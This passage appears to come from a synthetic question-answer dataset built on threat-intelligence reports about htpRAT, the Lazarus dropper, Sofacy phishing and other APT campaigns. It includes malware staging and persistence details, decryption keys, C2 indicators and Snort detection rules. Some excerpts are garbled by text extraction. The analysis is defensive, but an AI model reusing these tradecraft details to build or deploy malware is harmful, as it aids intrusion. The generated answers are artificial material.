left:\nC:\\Users\\cool\\Documents\\Visual Studio 2010\\Projects\\htpdll\\Release\\htpdll.pdb\nThis fourth stage of the infection is quite simple. It starts a new svchost process and decrypts a fifth stage payload it internally has stored and injects this into the svchost process. This starts a remote thread inside the svchost process to run the injected code. This final payload and the fifth stage is called 'htpdll' based on the project PDB path (this is where the name htpRAT comes from):\nThe fifth stage is the final stage and contains the core of the RAT which communicates with the C2 server and executes the attacker's commands.\nMedium Headline: Persistence & storage\nInitially when htpRAT starts it creates a mutexes to ensure there is only one instance running. The name of the mutex can be used as an indicator on an active system, it is hard coded as:\n{3084ADEC-04CF-4981-B6A0-87DC5C385E24}\nIt then obtains its local path in the appdata folder (which is %LOCALAPPDATA%\\Microsoft\\). This path is used to store a file called 'token.ini' in which the system uptime (in milliseconds) is contained. The token.ini file is formatted using the INI format through the use of the GetPrivateProfileString and WriteProfileString functions of the WinAPI. htpRAT uses the following hardcoded information to structure its app and key names in the INI file. This can be used to filter out legitimate 'token.ini' files, if encountered:\n{3084ADEC-04CF-4981-B6A0-87DC5C385E24}\nOnce htpRAT has its INI file written, it sets a startup entry in the registry to ensure automatic startup when a system is rebooted. A key is created under:\nSoftware\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\nThe keyname 'WindowsApp' has the value of the wininit.exe binary location in the Microsoft subfolder in local appdata.\nAnswer this question: What is the staged delivery process of the final htpRAT core, starting from the downloaded payload from the 'APA list.xls' file? Describe each stage in detail.",
    "output": "The staged delivery process of the final htpRAT core starts with the downloaded payload from the 'APA list.xls' file, which is renamed to 'ctfmon.exe'. Upon execution, it checks for a debugger and ensures it can execute the 'ipconfig' utility. It then drops a CAB file named 'temp.cab' in the local temp directory, which is decompressed using the Microsoft 'expand' utility. Three files from the CAB file are placed in the local application data folder in a subfolder called 'Microsoft'. The 'winnet.exe' file, a legitimate part of the F-Secure antivirus suite vulnerable to DLL side loading, is executed. This loads a malicious version of 'fsma32.dll', which decrypts and executes a fourth stage DLL. This fourth stage starts a new svchost process, decrypts a fifth stage payload, and injects it into the svchost process. The fifth stage is the final stage and contains the core of the RAT, which communicates with the C2 server and executes the attacker's commands.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Malware 11: Trojan Dropper 2\nFilename: gpsvc.exe\nMD5: 1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae\nSHA1: bedceafa2109139c793cb158cec9fa48f980ff2b\nFile Size: 3449344 bytes\nFile Type: PE32+ executable (console) x86-64, for MS Windows\nLink Time: 2016.12.08 00:53:20 (GMT)\nLinker version: 10.0\nUsed in: Polish bank\nThis module is a command line malware dropper/installer, which contains two data containers in the resource section.\nThe dropper command line takes the following:\ngpsvc.exe -e %name% - drop payload on disk gpsvc.exe -l - lists all registered services under netsvcs registry key3 .\ngpsvc.exe -a %param2% %param3% - registers a news service using %param2% as the service name and %param3% as the path to DLL file of service binary. If the %param3% doesn't contain \"\\\" character, the code uses it as the filename in %SYSTEMROOT%\\System32\\.\n3 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\netsvcs\nWhen -e option is used, the files stored in the containers are extracted, decrypted where encryption is used, and dropped to a disk in two locations: one goes to the current directory as %name%, another is saved into %SYSTEMROOT%\\Help\\%name%.chm. The value of the %name% parameter is passed via command line argument.\nThe container starts with a 40 bytes header describing the start of the payload, container and the payload data inside. The data may or may not be encrypted and there is no specific flag identifying that in container itself. The code processing the container will know whether the container's payload requires decryption.\nUpon successful extraction of the files, the dropper will show the following message on the command line:\nFig. Report of successful payload deployment.\nThe first extracted file is decrypted using the following key and Spritz algorithm, a variant of the RC4 family: 95 B4 08 68 E4 8B 72 94 5E 61 60 BF 3F D7 F9 41 10 9A 4A C4 66 41 99 48 CC 79 F5 6A FE 5F 12 E5\nThe second file is extracted as-is, however, brief analysis of its header suggested that it is encrypted with the same crypto and key.\nThe dropped files after decryption have the following MD5 hashes: ad5485fac7fed74d112799600edb2fbf 16a278d0ec24458c8e47672529835117\nMedium Headline: Malware 12: DLL Injector\nMD5: 16a278d0ec24458c8e47672529835117\nSHA1: aa115e6587a535146b7493d6c02896a7d322879e\nFile size: 1515008 bytes\nFile type: PE32+ executable (DLL) (GUI) x86-64, for MS Windows\nLink time: 2016.12.08 00:53:43 (GMT)\nLinker version: 10.0\nExport module name: wide_loader.dll\nUsed in: Incident #2\nThis module is packed with a commercial product known as , which was developed by a Russian software developer Vladimir Sukhov in 2004. This module is implemented as a service binary with ServiceMain procedure. On starting it imports all\nnecessary system API functions, and searches for the .CHM file inside %SYSTEMROOT%\\Help\\%name%.chm, where %name% matches the name of current DLL module. Then it decrypts the payload using the Spritz algorithm with the hardcoded key: 95 B4 08 68 E4 8B 72 94 5E 61 60 BF 3F D7 F9 41 10 9A 4A C4 66 41 99 48 CC 79 F5 6A FE 5F 12 E5\nNext, it searches the target process and attempts to inject the decrypted payload module from the CHM file into the address space of the target process. The target process can be one of two:\n1. lsass.exe\n2. itself (current service process)\nThe process to inject the code is hardcoded and defined during the compilation of the module. According to the code the current module injects payload into itself.\nSome more similar DLL Injector samples were found in Europe and in the Middle East. The following files were discovered:\nThese files are different from those previously seen in DLL Injector, because they are not packed with Enigma Protector. They also contain different 32-byte Spritz keys:\n\u25cf 65 06 18 33 60 10 48 F7 57 9B 98 76 CA B5 29 60 71 CB 0B 97 7E D4 A2 F9 22 CC 4E 79 52 64 4A 75\n\u25cf 6B EA F5 11 DF 18 6D 74 AF F2 D9 30 8D 17 72 E4 BD A1 45 2D 3F 91 EB DE DC F6 FA 4C 9E 3A 8F 98\n\u25cf 78 CB C3 77 35 5C F2 82  8A 3A 08 71 6A D5 C3 D9 A1 1B 6A BA C5 9C 5D BC 6A EC F0 B8 96 49 79 7A\nThe purpose of these variants is the same - decrypt the corresponding CHM file with the payload and inject it in the memory of lsass.exe or current process.\nThe payloads found in these cases were:\n\u25cf fde55de117cc611826db0983bc054624 (Active Advanced Backdoor Type B)\n\u25cf 17bc6f5b672b7e128cd5df51cdf10d37 (Active Advanced Backdoor Type B)\nMedium Headline: Malware 13: Active Backdoors 2\nFilename: %name%.chm\nMD5: ad5485fac7fed74d112799600edb2fbf\nSHA1: a107f1046f5224fdb3a5826fa6f940a981fe65a1\nFile size: 1861632 bytes\nFile type: PE32+ executable (DLL) (GUI) x86-64, for MS Windows\nLink time: 2016.12.08 00:55:06 (GMT)\nExport time: 2016.12.08 00:55:04 (GMT)\nLinker version: 10.0\nExport module name: aclui.dll\nThis module is dropped to the disk in .CHM file and stored in encrypted form. It can be decrypted and started with the DLL Injector module (i.e. 16a278d0ec24458c8e47672529835117). Like the other file in the same package, it is wrapped with Enigma Protector.\nThe module has no business logic starting from the entry point. Core logics are called from one of two exported functions:\n\u25cf ?DllRegister@@YAX_KK0K0PEAXK@Z (start backdoor with default parameters)\n\u25cf InitDll (start backdoor with configuration passed via parameter)\nThe InitDll function sets up basic requirements and prepares paths to other essential components, which are expected in the following filepaths:\n%SYSTEMROOT%\\Help\\*.chm\n%SYSTEMROOT%\\Help\\*.hlp\nThe .hlp file from the Help Directory is loaded and decrypted using Spritz algorithm4 and the following key:\n6B EA F5 11 DF 18 6D 74 AF F2 D9 30 8D 17 72 E4 BD A1 45 2D 3F 91 EB DE DC F6 FA 4C 9E 3A 8F 98\nThe module contains an embedded default config which is saved to .hlp file in encrypted form if the file is missing. It contains the following C2 information:\n\u25cf exbonus.mrbasic[.]com:443\nSimilar to Active Advanced Backdoor Type A (see md5: 2ef2703cfc9f6858ad9527588198b1b6) it doesn't use resolved IP of the C2 directly, but XORs the DNS query result with hardcoded key 0x4F833D5B.\nThe backdoor protocol supports the following commands sent as a DWORD, however this DWORD is convertible to a meaningful ASCII representation of the command as shown below:\n4 A very similar implementation of the Sprtiz algorithm in C is available at https://github.com/jedisct1/spritz/blob/master/spritz.c\nAn identical file was found in Incident #2:\nFilename: msv2_0.chm.dec\nMD5: 17bc6f5b672b7e128cd5df51cdf10d37\nSHA1: 072245dc2339f8cd8d9d56b479ba5b8a0d581ced\nFile size: 729088 bytes\nFile type: PE32+ executable (DLL) (GUI) x86-64, for MS Windows\nLink time: 2016.12.08 00:55:06 (GMT)\nExp. time: 2016.12.08 00:55:04 (GMT)\nLinker version: 10.0\nExport module name: aclui.dll\nAnother similar file was used during the attack in Incident #2:\nMD5: fde55de117cc611826db0983bc054624\nSHA1: 1eff40761643f310a5cd7449230d5cfe9bc2e15f\nFile size: 729088 bytes\nFile type: PE32+ executable (DLL) (GUI) x86-64, for MS Windows\nLink time: 2016.10.22 07:09:50 (GMT)\nExp. time: 2016.10.22 07:09:48 (GMT)\nLinker version: 10.0\nExport module name: aclui.dll\nThe .hlp file from the Help Directory is loaded and decrypted using the Spritz algorithm and the familiar key: 6B EA F5 11 DF 18 6D 74 AF F2 D9 30 8D 17 72 E4 BD A1 45 2D 3F 91 EB DE DC F6 FA 4C 9E 3A 8F 98\nThe .hlp file contains references to two C2 servers, which refer to:\ntradeboard.mefound[.]com:443\nmovis-es.ignorelist[.]com:443\nThe following table shows connections between known C2s\nSimilar two 32-bit based samples were used in an attack on a target in Costa Rica in 2016:\n\u25cf 2de01aac95f8703163da7633993fb447\n\u25cf 5fbfeec97e967325af49fa4f65bb2265\nThese samples contain the same backdoor commands and rely on the same cryptoalgorithm and identical hardcoded crypto key. However, these files do not contain embedded config with default C2 domain.\nQuestion: How does the Lazarus Group's trojan dropper (gpsvc.exe) handle the extraction and decryption of payloads? Explain the process in detail.",
    "output": "Answer: The Lazarus Group's trojan dropper (gpsvc.exe) handles the extraction and decryption of payloads through a series of steps. When the '-e' option is used, the dropper extracts files stored in its containers and drops them to the disk in two locations: one in the current directory as '%name%' and another in '%SYSTEMROOT%\\\\Help\\\\%name%.chm'. The value of the '%name%' parameter is passed via the command line argument. The container starts with a 40-byte header describing the start of the payload and the container data. The first extracted file is decrypted using the Spritz algorithm with the key '95 B4 08 68 E4 8B 72 94 5E 61 60 BF 3F D7 F9 41 10 9A 4A C4 66 41 99 48 CC 79 F5 6A FE 5F 12 E5'. The second file is extracted as-is but is likely encrypted with the same cryptographic method and key. Upon successful extraction, the dropper displays a message indicating the successful deployment of the payload.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: COnCLuSiOn\nOperation Woolen-GoldFish is alive and active. From a technical point of view, the threat actors involved in this campaign are less mature in terms of technical capacity and tactic sophistication compared with other targeted attack groups we are monitoring, yet they are improving and gaining traction. The spear-phishing email attacks are getting a little more aggressive and now have less user interaction at the point of entry. Nevertheless, it is unfortunately not because an attacker is inferior in skills that there are fewer victims. Operation Woolen-GoldFish has managed to successfully infiltrate several companies and organizations in Israel and Europe. One PowerPoint file used as a lure in spear-phishing attempts seems to indicate that the group has successfully victimized one well-known engineer in Israel and used one of his unreleased files as bait. Time and again, lack of proper security understanding and implementation has led individual and corporate users around the world to fall victim to creative malicious activities of threat actors. Threat actors are also known to be multiskilled.\nIn this case, we were able to confirm that Wool3n.H4t was not only responsible for most of the infecting Office files used, but was also capable of developing malware. The discovery of the CWoolger keylogger compiled on 7 February 2015 may be the strongest indication that this targeted attack group, where Woole3n.H4t seems to a part of, is very active and may be developing its own malware. With Wool3n.H4t as both the malware developer and infrastructure controller, it can be loosely deducted that the group comprise of very few people.\nSeeing the evolution of this targeted attack group, we believe its members, especially Wool3n.H4t, are traditional or old-fashioned cybercriminals. This assumption is based on the way the campaign spreads and evolves, including the use of nicknames and password used by Wool3n.H4t, which indicates that he rather comes from an underground hacking group. This campaign, like the first one the group launched, shows that the targeted entities do have a particular interest for the Islamic Republic of Iran. While motives behind targeted attack campaigns may differ, the end results are one and the same\u2014shift in power control, either economically or politically.\nThe authors would like to thank Ilja Lebedev for his valuable input in this research.\n\nWhat role does Wool3n.H4t play within the Operation Woolen-GoldFish campaign, and how does his involvement suggest the structure and capabilities of the group? How does the development of the CWoolger keylogger further support these observations?",
    "output": "A: Wool3n.H4t is responsible for most of the infecting Office files used in the Operation Woolen-GoldFish campaign and is also capable of developing malware. The discovery of the CWoolger keylogger, compiled on 7 February 2015, indicates that this targeted attack group is very active and may be developing its own malware. With Wool3n.H4t acting as both the malware developer and infrastructure controller, it can be loosely deduced that the group comprises very few people. Additionally, the use of nicknames and passwords by Wool3n.H4t suggests that he comes from an underground hacking group, indicating that the members of this campaign are traditional or old-fashioned cybercriminals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do threat actors like ELECTRUM and COVELLITE use compromised infrastructure to target Industrial Control Systems (ICS) and what are the implications for ICS defenders?",
    "output": "Compromise Infrastructure refers to the tactic of compromising third-party infrastructure, such as physical or cloud servers, domains, network devices, and third-party web and DNS services, to use during targeting. Adversaries may compromise infrastructure to stage, launch, and execute operations, making it difficult to tie their actions back to them. In the context of Industrial Control Systems (ICS), threat actors like ELECTRUM and COVELLITE have demonstrated the ability to compromise infrastructure to target ICS networks. For example, COVELLITE has used compromised infrastructure as Command and Control (C2) nodes, leveraging HTTPS for communication. Similarly, ELECTRUM has shown the ability to successfully operate within the ICS environment, potentially using compromised infrastructure to gain initial access. The use of compromised infrastructure by these threat actors highlights the importance of strengthening and hardening defenses at porous boundaries, such as the intersection of IT and ICS networks. ICS defenders must be aware of the potential for compromised infrastructure to be used in attacks and take proactive measures to monitor and secure their networks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nTA2541 is a persistent cybercriminal actor that distributes various remote access trojans (RATs) targeting the aviation, aerospace, transportation, and defense industries, among others. Proofpoint has tracked this threat actor since 2017, and it has used consistent tactics, techniques, and procedures (TTPs) in that time. Entities in the targeted sectors should be aware of the actor's TTPs and use the information provided for hunting and detection.\nTA2541 uses themes related to aviation, transportation, and travel. When Proofpoint first started tracking this actor, the group sent macro-laden Microsoft Word attachments that downloaded the RAT payload. The group pivoted, and now they more frequently send messages with links to cloud services such as Google Drive hosting the payload. Proofpoint assesses TA2541 is a cybercriminal threat actor due to its use of specific commodity malware, broad targeting with high volume messages, and command and control infrastructure.\nWhile public reporting detailing similar threat activities exists since at least 2019, this is the first time Proofpoint is sharing comprehensive details linking public and private data under one threat activity cluster we call TA2541.\n\nAnswer this question based on the above context: Why did TA2541 shift from using macro-laden Microsoft Word attachments to sending links to cloud services such as Google Drive for delivering their RAT payloads? How does this change in tactic affect the detection and mitigation strategies for cybersecurity experts?",
    "output": "TA2541 shifted from using macro-laden Microsoft Word attachments to sending links to cloud services such as Google Drive to deliver their RAT payloads as part of an evolution in their tactics, techniques, and procedures (TTPs). This shift likely occurred to evade traditional email security measures that often block or flag suspicious attachments. By using links to legitimate cloud services, TA2541 can bypass some initial layers of security, making it harder for automated systems to detect the malicious intent immediately. For cybersecurity experts, this change means that detection and mitigation strategies must adapt to include more sophisticated methods, such as analyzing the content hosted on cloud services, monitoring for unusual link-clicking behavior, and implementing advanced threat intelligence to identify known malicious URLs and patterns associated with TA2541.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the attackers behind the FinFisher APT use Masquerading: Right-to-Left Override to disguise the true nature of the malicious attachments in their spearphishing campaign?",
    "output": "Masquerading: Right-to-Left Override is a technique used by adversaries to disguise a string and/or file name to make it appear benign. In the case of the FinFisher APT, the attackers used this technique to disguise the true nature of the malicious attachments in their spearphishing campaign. Specifically, they used the RLO character (U+202E) to control the positioning of characters in text containing characters flowing from right to left, such as Arabic or Hebrew. By doing so, they made the malware appear as a harmless '.jpg' file, when in reality it was an executable '.exe' file. For example, the file 'exe.Rajab1.jpg' would be displayed as 'gpj.1bajaR.exe' when the UTF-8 based filename is displayed in ANSI. This allowed the attackers to trick victims into running the malware, thinking they were opening a harmless image file.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 3.1. Infection Vectors\nMalware writers are using multiple techniques to deliver their files and entice the victims to run them, creating an effective infection vector. Mainly depending on social engineering the attackers exploit:\n\u2022 Victims' trust in social networking forums\n\u2022 Victims' curiosity in following news related to political conflict in Syria\n\u2022 Victims' fear of attacks from government\n\u2022 Victims' lack of technology awareness\nOnce they have infected the victim's computer, attackers have full access and control over victim's devices. In the following section we show different versions of posts sent via popular file sharing sites or social networking platforms. The sample details and domain lists used by the attackers can be found in the Appendices 1 and 2 in the end of the document.\nSmall Headline: New samples\nMore recent samples, starting from the end of 2013, have shown a more organized development effort, creating highly stealth and graphically-enticing applications.\nIn this analysis we have seen how Syrian malware has evolved, showing no signs of stopping any time soon. Even though new malicious Syrian samples are appearing each day, the subset presented here will hopefully give the reader an overall view of the techniques and tools that are currently being used to target Syrian citizens.\nVery Small Headline: Curiosity killed the cat: browsing a  of wanted activists leads to infection.\n\u0627\n\u0631\u062a\u062e\u0627\u0642 \u0623\u0632\u0647\u062c\u0629 \u0627\u0648\u064a\u0628\u0645\u0643\u0644\u0631\u062a \u0627\u0627\u062e\u0644\u0629\u0635 \u0627\u0628\u0631\u062c\u0645\u0644\u0645 \u064a\u0644\u0639 \u0648\u0644\u0645\u0645\u0643 \u0648\u0627\u0628\u064a\u0642 \u0627\u0635\u0639\u0629\u0628 \u0627\u0644\u0627\u062f\u0633\nWe found a set of compressed files on a popular social networking site; when, extracted it showed a database containing a list of activists and wanted individuals in Syria. A video entitled was published on November 9 2013, and \" \u0655\" the download link for this database application was included in the information section of the video.\n\u0644\u0627\u0627 \u062c\u0645\u0627\u0646\u0631\u0628\u0654\u064a\u0646\u0637\u0648\u0644\u0627 \u0646\u0645\nThe download URL redirected victims to a file-sharing service where the file was being hosted. The .rar\", with the MD5 signature 0c711bf29815aecc65016712981compressed RAR file \" 59a74 and a file-size of 7,921,063 bytes was protected with the password \"111222333\".\nThe video requests the victim to scan the password protected \".rar\" file using VirusTotal to verify that it is not infected.\nAfter extracting all the files to a temporary folder, we were presented with the application itself and a text file needed to access the \"hidden\" features of the program.\nThe file \"PASSWORD.txt file\" contained the following text:\nVery Small Headline: syria123!@#\n\u0629\u0631\u0635\u0646\u0644\u0627 \u0629\u0647\u0628\u062c \u0629\u0646\u0635\u0627\u0631\u0642 \u0621\u0627\u0639\u062f\u0644\u0627\u0628 \u0627\u0646\u064a\u0644\u0639 \u0627\u0648\u0644\u062e\u0628\u062a \u0644\u0627\nUpon closer inspection, the first and last buttons of the application were functional, but the others generated error messages (claiming that some files were missing).\n\u0641\u064a\u0639 \u0634\u0627\u0634 \u0645\u0627\u0645\u0644\n, General Global File) uses \"data-base.db.exe\" (MD5 8f16efb51fe67961eThe first button ( e31c4f36cbe11db), which was placed into \"C:\\Users\\User\\AppData\\Roaming\"and, when executed, extracts the  Excel spreadsheet file \"Data-Base.xslx\" (MD5 f0a8a1556efbb106b6297700d4cce61b) from the \"Data-Base.db\" (MD5 95a5c3e91bbb4a3a323433841fbef82a) file in the main folder.\n\u0625\u0647\u0646\u0627\u0621 \u0627\u0644\u0631\u0628\u0646\u0627\u062c\u0645\n) is the exit button. The last button (\nHere is some interesting information worth noting:\n\u0628\u0631\u0646\u0627\u0645\u0627 \u062c\u0644\u0623\u0645\u0627 \u0646\u0644\u0648\u0637\u0646\u064a\n.exe\" is not detected as a malicious file. \"\u2022\n\u2022 The file \"data-Base.db\" is detected as a malicious file.\nThe file \"data-base.db\" is a compressed archive:\n\u2022 Product name from the file signature: Project1\n\u2022 Publisher name from the signature: Syrian malware\n\u2022 Compilation Timestamp: 2013-11-09 14:47:26\nWhen system32.exe is run, the process \"iexplorer.exe\" is spawned and is automatically registered for Startup.  The file connects to the IP address 31.9.48.7 TCP on port 999. As mentioned in , the IP address 31.9.48.7 belongs to the Syrian Telecommunications Establishment (STE).\nOther temporary files used for the infection were also detected, such as \"system32.exe\" (MD5: 9424b355a3670fd7749d3d25cbea18cb) which was copied into the \"C:\\Users\\user\\appdata\\ local\\temp\\\" folder.\nThe presence of DarkComet's \"DC_MUTEX-*\" was a giveaway of the usage of this remote administration tool.\nDuring infection, the Excel spreadsheet is displayed, comprising 96763 rows and 13 columns of activist information. The rows correspond to records of individuals wanted by the government and the columns correspond to information about the individuals. While there is no column description, data in each column reflects the type of data.\nSmall Headline: 3.2.2. Files named \"Scandals\" are quite attractive Using shockingly disturbing videos to distribute malware\n\u0641\u0636\u0627\u062d\u0626\nA disturbing video showing injured victims of recent bombings was used to appeal to people's fear and exert them to download a malicious application available in a public file-sharing website. After .exe\" proved to be heavily obfuscated with the commercial our initial analysis, the file named \" utility \"MaxToCode\" for .NET as a means of avoiding early detection by antivirus solutions.\nWhen executed, the original sample created another executable file in the Windows' temporary folder (C:\\Users\\[USERNAME]\\AppData\\Local\\Temp) named \"Trojan.exe\", which corresponds to the code of the RAT itself. This is used to save all keystrokes and system activity to another file in the same location, \"Trojan.exe.tmp\".\nCaptured information is sent to a dynamic domain corresponding to the host \"hacars11.no-ip.biz\", using local port 1177 with no SSL encryption (but base64 encoded), making the analysis of the network traffic a much easier task. During the initial connection to the remote server (after an initial ping to check for internet connectivity), the Trojan will send the machine's name, installed Windows version, logged username, webcam availability and the version of the RAT in use.\nSeveral embedded command line scripts are in charge of adding the Trojan's executable file to the Windows Firewall allowed list, while at the same time disabling security zone checking in Internet Explorer. System persistence is obtained via a modification in the \"Software\\Microsoft\\Windows\\ CurrentVersion\\Run\" registry key and by adding a copy of the malware to the Startup folder.\nEven though different obfuscation techniques are used in the samples we analysed, all of them have underlying dependencies on the .NET framework namespaces, which eventually allows deep source code inspection of the threat.\nSmall Headline: 3.2.3. \"Ammazon Internet Security\" the \"popular Antivirus\"\nIf you thought the era of fake antivirus programs was over, here comes a newly developed sample to challenge your beliefs. With the innocent title of \"Ammazon Internet Security\", this malicious application tries to mimic a security scanner, even including a quite thorough graphical user interface and some interactive functionality.\nAgain, this shows the simplicity of creating a graphical user interface that will trick most of the non-tech-savvy population. Using nothing more than a couple of buttons and a catchy name, Syrian malware groups were hoping that the intended victims would fall for the trap. Analyzing the code interestingly revealed that it has the look--feel of a security application; but, of course, no real security features. While silently executing a remote administration tool when launching this \"security suite\", targeted victims were left without their \"Ammazon\" protection but witha RAT installed.\nFrom the Windows process list shown in Process Explorer, we were able to see \"J. L Antivirus 4.0\" executing in our system, and through Process Monitor we caught the creation of the \"analysis\" log file for our fake antivirus. Behind the curtains, a connection is made to a remote host, sending real time information on all our activities \u2014 the real cost of this free internet security suite!\nAmong the many programming methods found inside the source code, we were even able to find a \"CheckForUpdates\" function; and if you look closely enough you can even see \"Detection\" and \"Quarantine\" assemblies included in this application. So, not only has a lot of work gone into creating this fake antivirus, the authors also followed good programming practices and implemented modules for each specific (albeit fake) functionality. Maybe at a really quick first sight this could pose as a legitimate tool, but a deeper inspection reveals its true malicious nature.\nThe real log file was one where all keystrokes were recorded and later sent from the computer via a TCP connection. Even though this type of keylogging functionality is nothing new, when we consider how these malicious applications are being used, and the control they give to the attackers, we can start to measure the importance of reporting these threats and providing protection from them.\nEvidently, the malware authors didn't care much to provide an option to close the \"antivirus\", and if you were to kill the process you would get a nice 'blue screen of death' and an unexpected system reboot. Surely, the fake application will load  again once everything is back up, creating an interesting method for guaranteeing persistence.\nRead the text above and answer this question: How did the attackers ensure persistence and control over the infected systems in the case of the 'Curiosity killed the cat' infection vector?",
    "output": "In the 'Curiosity killed the cat' infection vector, the attackers ensured persistence and control over the infected systems by using a multi-step approach. The malicious application extracted a malicious Excel spreadsheet from a hidden file. The file 'system32.exe' was copied into the temporary folder and executed, spawning the process 'iexplorer.exe' and registering it for Startup. The file connected to the IP address 31.9.48.7 on port 999, which belonged to the Syrian Telecommunications Establishment (STE). Temporary files used for the infection were also detected, and the presence of DarkComet's 'DC_MUTEX-*' indicated the usage of a remote administration tool.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Analysis\nSofacy has been discussed before as being used to target APEC members2 and there has also been some prior analysis of the malware itself3 . Variants of the malware have been in use for a considerable amount of time \u2013 for example, the screenshot below is from the decoy document loaded by one of the earliest versions present on ThreatExpert4 , from February 2010.\nDecoy documents are used in conjunction with malware droppers in order to make the target believe the file they have just opened is legitimate. The documents often give an indication of the attackers' intended targets.\nMore recently, ESET have reported5 on related spear phishes using NATO/Ukrainian conflict themes and watering hole attacks likely targeting the defence industry and a Polish finance company. It has been publicly speculated before that Sofacy malware is Russian in origin. Indicators found in the malware analysis referenced in the appendix, such as embedded resources and targeting would appear to support this theory.\n1 http://www.symantec.com/security_response/writeup.jsp?docid=2011-090714-2907-99\n2 http://blog.trendmicro.com/trendlabs-security-intelligence/spoofed-apec-2013-email-mixes-old-threat-tricks/\n3 http://thegoldenmessenger.blogspot.de/2012/12/3-disclosure-of-another-0day-malware.html\n4 http://threatexpert.com/reports.aspx?find=netids.dll\n5 http://welivesecurity.com/2014/10/08/sednit-espionage-group-now-using-custom-exploit-kit/\nBig Headline: Targeting\nRecently, we observed a number of new domain registrations by the Sofacy attackers, all of which are closely related via shared WHOIS data and infrastructure. New domain registrations are usually indicative of a new campaign, and so we were eager to find new samples of the malware which connected to the infrastructure. The domain names chosen were almost identical to the legitimate domains of several organisations, a common technique and, like carefully chosen decoy documents, often gives clues as to the likely targets of the campaign. The new domain names mimicked organisations in the following categories:\n\u2022 International and European diplomatic institutions\n\u2022 Popular providers of web services\n\u2022 Military institutions, contractors and conferences\n\u2022 Energy companies\n\u2022 News organisations based out of the United States and Central Europe\nIn addition to new malware samples, we also found examples where the attackers were using the simple technique of phishing for credentials. The usage of malware in targeted attacks to steal information of value to attackers has been widely reported, however the simple technique of phishing for credentials, whilst still relatively common in targeted attacks, is still more typically associated with criminal attackers involved in day to day cyber-fraud.\nThe pages used for phishing typically used obfuscated code to redirect the user to another webpage:\nIn some pages the malicious redirect was disabled by the attackers, by placing additional JavaScript on the page which would redirect users to a legitimate site preferentially.\nFake login pages were observed both for webmail and two factor-authentication platforms. In the second case this would require the attackers to log in at the same time as affected victims, showing a level of dedication to the cause. As well as the domains used being similar to those of the targeted, the pages were also made to appear the same as their legitimate counterparts, making it difficult for end-users to tell they were being duped.\nFor example the screenshot below shows the contents of a credential phishing website designed to mimic the legitimate OWA site of a defence contractor. The attacker's version is on the left, the real version is on the right:\nTwo of the domains we identified have previously been associated in open source with credential phishing, although not attributed to this group of attackers:\n\uf0b7 In October 2013 the domain chmail[.]in was reported6 as being used in widespread attacks against users of the Iranian mail service chmail[.]ir\n\uf0b7 In January 2014 the domain google-settings[.]com was reported7 as being used in credential theft against some gmail users.\nBig Headline: Recommended Actions\nAs ever with phishing attacks, one of the most important preventative steps you can take is to educate staff on how to identify suspicious emails \u2013 especially as there are fewer technical measures that can be taken to prevent low distribution phishing attacks which aim to steal credentials than there are for similar attacks involving malware.\nOrganisations with good logging for their e-mail data could attempt to detect activity relating to compromised accounts by alerting on \"impossible journeys\", where locations from which users log in are monitored and where alerts are produced when a single user logs in from two separate countries in a short period of time.\nBig Headline: Snort Signatures\nWe have developed some SNORT signatures to detect the current template used by the attackers in their phishing campaigns. The following signatures detect Javascript that is present on many obfuscated redirects, not necessarily related to this activity but which may be indicative of Sofacy phishing:\n6 http://www.asriran.com/fa/news/299798/%D8%A7%DB%8C%D9%85%DB%8C%D9%84-%DA%86%D8%A7%D9%BE%D8%A7%D8%B1-%D9%87%D8%AF%D9%81-%D8%AD%D9%85%D9%84%D9%87-%D9%87%DA%A9%D8%B1%D9%87%D8%A7-%D9%82%D8%B1%D8%A7%D8%B1-%DA%AF%D8%B1%D9%81%D8%AA\n7 http://www.spamfighter.com/News-18805-Security-Researcher-Intercepted-Phishing-Email-Campaign-which-Aimed-at-Google-Users.htm\nalert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:\"Potential Sofacy Phishing Redirect\"; flow:established,to_client; content:\"\\\"\\\\x6C\\\\x6F\\\\x63\\\\x61\\\\x74\\\\x69\\\\x6F\\\\x6E\\\"\"; classtype:trojan-activity;\nreference:url,http://pwc.blogs.com/cyber_security_updates/2014/10/phresh-phishing-against-government-defence-and-energy.html; sid:xxxxxx; rev:1;)\nalert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:\"Potential Sofacy Phishing Redirect\"; flow:established,to_client; content:\"\\\"x6Cx6Fx63x61x74x69x6Fx6E\\\"\"; classtype:trojan-activity; reference:url,http://pwc.blogs.com/cyber_security_updates/2014/10/phresh-phishing-against-government-defence-and-energy.html; sid:xxxxxx; rev:1;)\nThe following comment occurs in many of the pages we've observed relating to this campaign, but can also appear in some legitimate sites:\nalert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:\"Potential Sofacy Phishing Redirect\"; flow:established,to_client; content:\"// stop for sometime if needed\"; classtype:trojan-activity; reference:url,http://pwc.blogs.com/cyber_security_updates/2014/10/phresh-phishing-against-government-defence-and-energy.html; sid:xxxxxx; rev:1;)\nFor more information on this threat actor and further indicators of compromise, please get in touch with us at .\nRead the text above and answer this question: How does the use of decoy documents in conjunction with malware droppers enhance the effectiveness of Sofacy's phishing campaigns?",
    "output": "Decoy documents are used in conjunction with malware droppers to make the target believe the file they have just opened is legitimate. This technique enhances the effectiveness of Sofacy's phishing campaigns by giving an indication of the attackers' intended targets and making the malicious activity appear less suspicious. For instance, the documents often contain content that is relevant to the target, such as themes related to NATO/Ukrainian conflicts or defence industry topics, which increases the likelihood that the target will interact with the malicious content.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
